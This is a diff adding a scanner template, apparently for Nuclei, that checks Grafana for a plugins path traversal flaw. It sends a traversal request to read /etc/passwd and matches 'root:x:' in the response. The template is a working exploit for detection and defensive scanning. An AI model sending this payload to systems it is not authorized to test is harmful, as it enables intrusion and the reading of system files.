@@ -1,0 +1,52 @@
+id: grafana-plugins-path-traversal
+info:
+  name: Grafana Plugins Path Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: path-traversal,grafana
+
+variables:
+  r_path:
+    - "/"
+    - "/grafana/"
+
+http:
+  - raw:
+      - |
+        GET {{r_path}}public/plugins/graph/README.md HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Graph Panel"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+
+  - raw:
+      - |
+        GET {{r_path}}public/plugins/graph/#/../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:x:"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
